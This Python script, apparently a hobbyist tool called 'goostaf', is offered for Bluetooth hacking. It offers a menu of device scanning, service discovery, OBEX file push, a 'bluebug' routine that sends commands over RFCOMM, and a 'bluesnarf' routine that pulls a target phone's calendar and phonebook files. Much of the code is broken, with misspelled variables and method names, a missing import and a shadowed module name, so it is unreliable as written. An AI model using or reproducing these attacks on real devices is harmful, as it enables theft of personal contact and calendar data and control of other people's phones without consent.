#!/usr/bin/python
# welcome to goostaf tool for bluetooth hacking and pentesting 
# coded by amicheh or yaser
import os
from colorama import Fore


def sdp_brows():
    import bluetooth as bt
    import sys
    if len(sys.argv) < 2:
        print ("usage:" +sys.argv[0]+"<addr>")
        sys.exit(0)
    services = bt.find_service(address=sys.argv[1])
    if (len(esrvice)<1):
        print ("no service found")
    else :
        for srvice in  services :
            for(key,value) in service.items():
                print (key+":"+str(value))
            print (" ")

def gatt():
    from gattlib import GATTRequester
    import sys

    if len(sys.argv) < 2:
        print ("usage:"+sys.argv[0]+"<addr>")
        sys.exit(0)
    req = GATTRequester(sys.argv[1],True)

    for service in requester.discover_primary():
        print (service)

def scanner():
    import bluetooth as bt 
    for (addr ,name) in bt.discover_devices(lookup_names=True):
        print ("%s %s"%(addr,name)) 


def obex():
    #anime
    import sys 
    from os.path import basename
    from PyOBEX import client,headers,responses 

    if len(sys.argv) < 4:
        print (sys.argv[0] + ":<btaddr> <channel> <file>")
        sys.exit(0)
    btaddr = sys.argv[1]
    channel = int(sys.argv[2])
    my_file = sys.argv[3]

    c = client.client(btaddr,channel)
    r = None

    try:
        print ("conccecting to %s on channel %d" % (btaddr,channel))
        r = c.conccec(header_list = (headers.Target("OBEXobjectPush"),))


    except OSError as e:
        print ("connect failed." + str(e))

    if isinstance(r, responses.ConnectSuccess):
        print ("Uploading file "+my_file)
        r = c.put(basename(my_file),open(my_file,"rb").read())
        if not isinstance(r, responses.Success):
            print ("Failed!")
        c.disconnect()
    else :
        print ("connect failed !")

def blue_bug():

    import sys 
    import bluetooth as bt 

    if len(sys.argv) < 2 :
        print (sys.argv[0]+ "<btaddr> <channel>")
        sys.exit(0)

    btaddr = sys.argv[1]
    channel = int(sys.argv[2]) or 17
    running = True

    sock = bt.BluetoothSocket(bt.RFCOMM)

    sock.connect((sys.argv[1],channel))

    while running:
        cmd = input("goostaf:>")
        if cmd == "quit" or cmd == "exit":
            running = False
        else :
            sock.send(cmd)
    sock.close()

def blue_snarf():
    def get_file(client , filename):
        import sys 
        from os.path import basename
        from PyOBEX import client 
        from PyOBEX import headers
        from PyOBEX import responses

        r = client.get(filename)

        if isinstance(r,responses.FailureResponse):
            print ("Filed to get file" + filename)
        else:
            headers,data = r
            fh = open(filename,"w+")
            fh.write(data)
            fh.close()
    if len(sys.argv) < 3:
        print (sys.argv[0] + ":<btaddr> <channel> ")
        sys.exit()
    btaddr = sys.argv[1]
    channel = int(sys.argv[2])
    print ("blue snarfing %s on channel %d" % (btaddr,channel))
    c = client.BrowseClient(btaddr,channel)
    try:
        r = c.connect()
    except OSError as e :
        print ("connect failed." + str(e))
    if isinstance(r,responses.ConnectSuccess):
        c.setpath("telecom")
        get_file(c,"cal.vcs")
        get_file(c, "pb.vcf")
        c.disconnect()



os.system("clear")

print (Fore.GREEN+"""
$###########################################################$
$###########################################################$
$                                                           $
$                   welcome to goostaf                      $
$               coded by  amicheh or yser                   $
$                                                           $
$###########################################################$
$###########################################################$
""")

print (Fore.RED+"""
[1] sdp browse
[2] blue gatt
[3] blue scanner
[4] blue obex
[5] blue bugg
[6] blue snarf

""")

try:
    input1 = input(Fore.RED+" ┌───────────────────────────────────────["+Fore.CYAN+"goostaf(amicheh)"+Fore.BLUE+"~"+Fore.WHITE+"@goodrat"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")
    if input1 == "1":
        sdp_brows()
    
    if input1 == "2":
        gatt()

    if input1 == "3":
        scanner()
    
    if input1 == "4":
        obex()

    if input1 == "5":
        blue_bug()

    if input1 == "6":
        blue_snarf()

except:
    
    print ("please try again and read a source code")
